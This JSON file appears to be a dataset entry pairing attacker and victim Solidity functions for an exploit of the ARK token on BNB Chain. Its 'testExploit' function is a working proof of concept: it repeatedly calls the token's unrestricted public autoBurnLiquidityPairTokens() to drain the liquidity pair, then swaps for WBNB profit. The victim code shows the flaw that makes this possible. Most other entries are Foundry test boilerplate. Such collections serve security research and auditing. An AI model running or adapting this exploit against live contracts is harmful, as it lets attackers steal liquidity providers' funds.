[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() external {\n        cheats.createSelectFork(\"bsc\", 37_221_235);\n        // explotier have\n        deal(address(WBNB), address(this), 100);\n        deal(address(ARK), address(this), 4 ether);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        emit log_named_decimal_uint(\"[Begin] Attacker WBNB before exploit\", WBNB.balanceOf(address(this)), 18);\n        uint256 i = 0;\n        while (i < 10_000) {\n            ARK.autoBurnLiquidityPairTokens();\n            if (ARK.balanceOf(address(ARK_WBNB)) < 1_700_000_000_000) {\n                break;\n            }\n            i++;\n        }\n        WBNB.transfer(address(ARK_WBNB), 100);\n        ARK.transfer(address(ARK_WBNB), ARK.balanceOf(address(this)));\n        (uint256 _reserve0, uint256 _reserve1,) = ARK_WBNB.getReserves();\n        uint256 Ark_balance = ARK.balanceOf(address(ARK_WBNB));\n        address[] memory path = new address[](2);\n        path[0] = address(ARK);\n        path[1] = address(WBNB);\n        uint256[] memory amountOut = router.getAmountsOut(Ark_balance - _reserve1, path);\n        ARK_WBNB.swap(amountOut[1], 0, address(this), \"\");\n        emit log_named_decimal_uint(\"[End] Attacker WBNB after exploit\", WBNB.balanceOf(address(this)), 18);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Ark",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n\n",
    "description": ""
  },
  {
    "contract/interface": "Ark",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint256 amount)\n        public\n        override\n        returns (bool)\n    {\n        _approve(msg.sender, spender, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Ark",
    "source_type": "victim_contract",
    "function_name": "autoBurnLiquidityPairTokens",
    "original_code": "    function autoBurnLiquidityPairTokens() public {\n        lastLpBurnTime = block.timestamp;\n        uint256 liquidityPairBalance = balanceOf(_mainPair);\n        uint256 amountToBurn = (liquidityPairBalance * percentForLPBurn) /\n            10000;\n        if (amountToBurn > 0) {\n            _basicTransfer(_mainPair, address(0xdead), amountToBurn);\n        }\n        ISwapPair(_mainPair).sync();\n        emit AutoNukeLP();\n    }\n\n    event AutoNukeLP();\n\n",
    "description": ""
  },
  {
    "contract/interface": "Ark",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Ark",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "    function decimals() external view override returns (uint8) {\n        return _decimals;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Ark",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Ark",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "    function name() external view override returns (string memory) {\n        return _name;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Ark",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(_owner == msg.sender, \"!owner\");\n        _;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Ark",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "    function symbol() external view override returns (string memory) {\n        return _symbol;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Ark",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "    function totalSupply() public view override returns (uint256) {\n        return _tTotal;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Ark",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n\n",
    "description": ""
  },
  {
    "contract/interface": "Ark",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n}\n\ninterface ISwapRouter {\n",
    "description": ""
  },
  {
    "contract/interface": "Ark",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "",
    "description": ""
  }
]